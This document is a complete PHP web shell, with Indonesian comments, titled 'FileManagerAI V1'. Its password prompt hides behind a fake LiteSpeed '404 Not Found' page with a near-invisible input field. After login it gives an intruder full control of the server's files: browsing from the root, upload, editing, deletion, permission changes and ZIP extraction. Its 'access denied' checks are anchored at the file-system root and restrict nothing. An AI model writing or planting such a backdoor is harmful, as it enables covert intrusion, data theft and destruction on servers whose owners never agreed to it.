<?php
session_start();

// Hash password yang benar (gunakan hash yang dihasilkan dari password_hash)
$hashed_pass = '$2y$10$3CIM2PJAvpbiYODK83geVu1cookk8Y8E8mm2H0RjT9JY3cCwLf1TK'; 

// Fungsi login
if (isset($_POST['password'])) {
    $password = $_POST['password'];

    // Verifikasi hash password
    if (password_verify($password, $hashed_pass)) {
        $_SESSION['logged_in'] = true;
    } else {
        $error = "Password salah!";
    }
}

// Logout
if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Cek login
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    // Jika belum login, tampilkan form login
    ?>
    <!DOCTYPE html>
    <html>
    <head>
 
        <title>404 Not Found</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="robots" content="noindex,nofollow">
        <style>
            @media (prefers-color-scheme:dark){body{background-color:#000!important}}
            input[type="password"] {
                border: none;
                border-bottom: 1px #00000000;
                padding: 2px;
            }
            input[type="password"]:focus {
                outline: none;
            }
        </style>
    </head>
    <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
        <div style="height:auto; min-height:100%;">     
            <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
                <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
                <h2 style="margin-top:20px;font-size: 30px;">Not Found</h2>
                <p>The resource requested could not be found on this server!</p>
            </div>
        </div>
        <div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
            <br>Proudly powered by LiteSpeed Web Server
            <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
        </div>       

        <?php if (isset($error)): ?>
            <p style="color: red;"><?php echo $error; ?></p>
        <?php endif; ?>
        <form method="post" action="">
            <div style="position: fixed; bottom: 10px; left: 5px;">
                <input type="password" name="password" required>
            </div>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// Fungsi untuk menghapus folder secara rekursif
function delete_directory($dir) {
    if (!file_exists($dir)) {
        return false;
    }

    if (!is_dir($dir)) {
        return unlink($dir);
    }

    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }

        if (!delete_directory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }

    return rmdir($dir);
}

// Set directory path
$dir = isset($_GET['dir']) ? $_GET['dir'] : '../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../';
$home_dir = '../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../'; // Direktori utama atau tempat file berada



// Fungsi untuk mengunggah file
if (isset($_FILES['file'])) {
    $target_file = realpath($dir) . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    
    // Keamanan: Pastikan target file berada di dalam direktori home
    $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    $target_path = realpath(dirname($target_file)) . DIRECTORY_SEPARATOR . basename($target_file);
    if (strpos($target_path, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            echo "File berhasil diunggah.";
        } else {
            echo "Gagal mengunggah file.";
        }
    }
}

// Fungsi untuk membuat direktori baru
if (isset($_POST['new_dir'])) {
    $new_dir = realpath($dir) . DIRECTORY_SEPARATOR . basename($_POST['new_dir']);
    
    // Keamanan: Pastikan direktori baru berada di dalam direktori home
    $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    $new_dir_real = realpath(dirname($new_dir)) . DIRECTORY_SEPARATOR . basename($new_dir);
    if (strpos($new_dir_real, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (mkdir($new_dir, 0755)) {
            echo "Direktori berhasil dibuat.";
        } else {
            echo "Gagal membuat direktori.";
        }
    }
}

// Fungsi untuk menghapus file atau direktori
if (isset($_GET['delete'])) {
    $path = realpath($dir . $_GET['delete']);
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan path berada di dalam direktori home
    if (strpos($path, $base) !== 0) {
        echo "Access denied.";
        exit;
    }

    if (is_dir($path)) {
        if (delete_directory($path)) {
            echo "Direktori berhasil dihapus.";
        } else {
            echo "Gagal menghapus direktori.";
        }
    } else {
        if (unlink($path)) {
            echo "File berhasil dihapus.";
        } else {
            echo "Gagal menghapus file.";
        }
    }
}

// Fungsi untuk mengedit file
if (isset($_POST['save_file'])) {
    $file_path = realpath($dir) . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan file berada di dalam direktori home
    if (strpos($file_path, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (file_put_contents($file_path, $_POST['file_content']) !== false) {
            echo "File berhasil diedit.";
        } else {
            echo "Gagal mengedit file.";
        }
    }
}

// Fungsi untuk mengganti nama file atau direktori
if (isset($_POST['rename_file'])) {
    $old_name = realpath($dir) . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
    $new_name = realpath($dir) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan kedua path berada di dalam direktori home
    if (strpos($old_name, $base) !== 0 || strpos($new_name, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (rename($old_name, $new_name)) {
            echo "Nama berhasil diganti.";
        } else {
            echo "Gagal mengganti nama.";
        }
    }
}

// Fungsi untuk membuat file kosong
if (isset($_POST['create_file'])) {
    $file_name = basename($_POST['file_name']);
    $file_ext = isset($_POST['file_ext']) && !empty($_POST['file_ext']) ? '.' . preg_replace('/[^a-zA-Z0-9_\-]/', '', $_POST['file_ext']) : '.txt';
    $full_file_name = realpath($dir) . DIRECTORY_SEPARATOR . $file_name . $file_ext;
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan file berada di dalam direktori home
    if (strpos($full_file_name, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (file_put_contents($full_file_name, '') !== false) {
            echo "File kosong berhasil dibuat.";
        } else {
            echo "Gagal membuat file kosong.";
        }
    }
}

// Fungsi untuk mengubah permissions file atau direktori
if (isset($_POST['change_permissions'])) {
    $file_path = realpath($_POST['file_path']);
    $new_permissions = octdec($_POST['new_permissions']); // Mengkonversi input menjadi format oktal
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan file berada di dalam direktori home
    if (strpos($file_path, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (chmod($file_path, $new_permissions)) {
            echo "Permissions successfully changed.";
        } else {
            echo "Failed to change permissions.";
        }
    }
}


// Fungsi untuk copy file
if (isset($_GET['copy'])) {
    $file_to_copy = realpath($dir . $_GET['copy']);
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan file berada di dalam direktori home
    if (strpos($file_to_copy, $base) !== 0 || !is_file($file_to_copy)) {
        echo "Access denied.";
    } else {
        $_SESSION['file_to_copy'] = $file_to_copy; // Simpan path file di session
        echo "The file is ready to be pasted.";
    }
}

// Fungsi untuk paste file
if (isset($_GET['paste'])) {
    if (isset($_SESSION['file_to_copy'])) {
        $source_file = $_SESSION['file_to_copy'];
        $destination_file = realpath($dir) . DIRECTORY_SEPARATOR . basename($source_file);
        
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
        // Keamanan: Pastikan tujuan paste berada di dalam direktori home
        if (strpos(realpath($dir), $base) !== 0) {
            echo "Access denied.";
        } else {
            if (copy($source_file, $destination_file)) {
                echo "File berhasil di-paste.";
            } else {
                echo "Gagal mem-paste file.";
            }
        }
    } else {
        echo "Tidak ada file yang di-copy.";
    }
}

// Fungsi untuk mengekstrak file ZIP
if (isset($_FILES['zip_file'])) {
    $zip_file = $_FILES['zip_file']['tmp_name'];
    $extract_to = realpath($dir);

    // Keamanan: Pastikan tujuan ekstraksi berada di dalam direktori home
 $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama   
    if (strpos($extract_to, $base) !== 0) {
        echo "Access denied.";
    } else {
        $zip = new ZipArchive;
        if ($zip->open($zip_file) === TRUE) {
            $zip->extractTo($extract_to);
            $zip->close();
            echo "File ZIP berhasil diekstrak.";
        } else {
            echo "Gagal mengekstrak file ZIP.";
        }
    }
}

// Tampilkan file dan direktori
$files = scandir($dir);
?>

<!DOCTYPE html>
<html>
<head>
    <title>FileManagerAI</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="robots" content="noindex,nofollow">
    <style>
        body { font-family: Arial, sans-serif; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px 12px; border: 1px solid #ddd; text-align: left; }
        th { background-color: #f2f2f2; }
        a { text-decoration: none; color: blue; }
        a:hover { text-decoration: underline; }

form {

    padding: 10px;
    border: 1px solid #ddd;
    background-color: #f9f9f9;
    border-radius: 5px;

}

label {
    display: block;
    margin-bottom: 8px;
    font-weight: bold;
}

input[type="text"], input[type="file"], textarea {
    width: 100%;
    margin-bottom: 10px;
    border: 1px solid #ccc;
    border-radius: 4px;
}

input[type="submit"] {
    background-color: #4CAF50;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}

input[type="submit"]:hover {
    background-color: #45a049;
}



    </style>

</head>
<body>
   <center> <h2>FileManagerAI V1</h2> </center>


    <!-- Tombol Logout -->
    <form action="" method="post">
        <input type="submit" name="logout" value="Logout">
    </form>


    <table>
        <tbody>
            <tr>
<td>
    <!-- Form untuk mengunggah file -->
    <form action="?dir=<?php echo urlencode($dir); ?>" method="post" enctype="multipart/form-data">
        <label>Upload file:</label>
        <input type="file" name="file" required>
        <input type="submit" value="Submit">
    </form>
</td>
<td>
    <!-- Form untuk membuat direktori baru -->
    <form action="?dir=<?php echo urlencode($dir); ?>" method="post">
        <label>Make Dir:</label>
        <input type="text" name="new_dir" required>
        <input type="submit" value="Submit">
    </form>
</td>



<td>

    <!-- Form untuk membuat file kosong -->
   
    <form action="?dir=<?php echo urlencode($dir); ?>" method="post">
        <label>Make file (.txt):</label>
        <input type="text" name="file_name" required><br>
        <label>Extensions file (Optional):</label>
        <input type="text" name="file_ext">
        <input type="submit" name="create_file" value="Submit">
    </form>
</td>


            </tr>
        </tbody>
    </table>
    <!-- Form untuk mengganti nama file atau direktori -->
    <?php if (isset($_GET['rename'])): ?>
        <h3>ReName</h3>
        <form action="" method="post">
            <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>">
            <label>Nama baru:</label>
            <input type="text" name="new_name" value="<?php echo htmlspecialchars($_GET['rename']); ?>" required>
            <input type="submit" name="rename_file" value="Submit">
        </form>
    <?php endif; ?>

    <!-- Jika file yang akan diedit dipilih -->
    <?php
    if (isset($_GET['edit'])) {
        $file_to_edit = realpath($dir . $_GET['edit']);
        

        // Keamanan: Pastikan file berada di dalam direktori home
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
        if (strpos($file_to_edit, $base) !== 0 || !is_file($file_to_edit)) {
            echo "Access denied.";
        } else {
            $file_content = file_get_contents($file_to_edit);
            ?>
            <h3>Edit File: <?php echo htmlspecialchars($_GET['edit']); ?></h3>
            <form action="" method="post">
                <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                <textarea name="file_content" rows="10" cols="50"><?php echo htmlspecialchars($file_content); ?></textarea><br>
                <input type="submit" name="save_file" value="Save">
            </form>
            <?php
        }
    }
    ?>

    <!-- Daftar file dan direktori -->
    <h3>Daftar File/Folder di: <?php echo htmlspecialchars($dir); ?> </h3>
<?php
// Mengambil direktori kerja saat ini
$direktori_sekarang = getcwd();
echo "" . htmlspecialchars($direktori_sekarang);
?>
<a href="?dir=<?php echo urlencode($direktori_sekarang); ?>/">[Home]</a>

<br>
<a id="dynamic-link" href="?dir=/">[Root]</a>

<table>
    <tr>
        <th>Name</th>
        <th>Size</th> <!-- Header untuk ukuran -->
        <th>Modify</th> <!-- Header untuk tanggal modifikasi -->
        <th>Permissions</th> <!-- Header untuk permissions -->
        <th>Actions</th>
    </tr>

    <tr>
        <td><a href="?dir=<?php echo urlencode(dirname($dir)) . '/'; ?>">⏪</a></td>
        <td></td> <!-- Kosongkan ukuran untuk link direktori -->
        <td></td> <!-- Kosongkan modifikasi untuk link direktori -->
        <td></td> <!-- Kosongkan permissions untuk link direktori -->
        <td>    
<!-- Tombol Paste -->
    <?php if (isset($_SESSION['file_to_copy'])): ?>
        <form action="?dir=<?php echo urlencode($dir); ?>&paste" method="post">
            <input type="submit" value="Paste file here">
        </form>
    <?php endif; ?></td> <!-- Kosongkan tindakan untuk link direktori -->
    </tr>

    <?php 
    // Pisahkan folder dan file
    $folders = [];
    $filesList = [];
    
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . $file)) {
                $folders[] = $file;
            } else {
                $filesList[] = $file;
            }
        }
    }
    
    // Tampilkan folder terlebih dahulu
    foreach ($folders as $folder): ?>
        <tr>
            <td>
                <a href="?dir=<?php echo urlencode($dir . $folder . '/'); ?>"><?php echo htmlspecialchars($folder); ?>/</a>
            </td>
            <td></td> <!-- Kosongkan ukuran untuk folder -->
            <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $folder)); // Tanggal terakhir modifikasi ?></td>
            <td>
                <form action="" method="post" style="display:inline;">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($dir . $folder); ?>">
                    <input type="text" name="new_permissions" placeholder="<?php echo substr(sprintf('%o', fileperms($dir . $folder)), -4); // Menampilkan permission folder ?>" style="width:80px;" required>
                    <input type="submit" name="change_permissions" value="Change">
                </form>
            </td>
            <td>
                <a href="?dir=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($folder); ?>" onclick="return confirm('Delete folder ?')">[Delete]</a>
                <a href="?dir=<?php echo urlencode($dir); ?>&rename=<?php echo urlencode($folder); ?>">[ReName]</a>
		
            </td>
        </tr>
    <?php endforeach; ?>

    <!-- Tampilkan file setelah folder -->
    <?php foreach ($filesList as $file): ?>
        <tr>
            <td>
                <a href="<?php echo htmlspecialchars($dir . $file); ?>" download><?php echo htmlspecialchars($file); ?></a>
            </td>
            <td><?php echo number_format(filesize($dir . $file) / 1024, 2) . ' KB'; // Ukuran file dalam KB ?></td>
            <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $file)); // Tanggal terakhir modifikasi ?></td>
            <td>
                <form action="" method="post" style="display:inline;">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($dir . $file); ?>">
                    <input type="text" name="new_permissions" placeholder="<?php echo substr(sprintf('%o', fileperms($dir . $file)), -4); // Menampilkan permission file ?>" style="width:80px;" required>
                    <input type="submit" name="change_permissions" value="Change">
                </form>
            </td>
            <td>
                <a href="?dir=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($file); ?>" onclick="return confirm('Delete file ?')">[Delete]</a>
                <a href="?dir=<?php echo urlencode($dir); ?>&edit=<?php echo urlencode($file); ?>">[Edit]</a>
                <a href="?dir=<?php echo urlencode($dir); ?>&rename=<?php echo urlencode($file); ?>">[ReName]</a>
                <a href="?dir=<?php echo urlencode($dir); ?>&copy=<?php echo urlencode($file); ?>">[Copy]</a>
            </td>
        </tr>
    <?php endforeach; ?>
</table>






    <!-- Form untuk mengunggah dan mengekstrak file ZIP -->
    <form action="?dir=<?php echo urlencode($dir); ?>" method="post" enctype="multipart/form-data">
        <label>Upload and extract ZIP file:</label>
        <input type="file" name="zip_file" required>
        <input type="submit" value="Extract ZIP">
    </form>

<br>
<center>[<a target="_blank"  href="https://bukakartu.id/minidbai">minidbai</a>]</center>
</body>
</html>
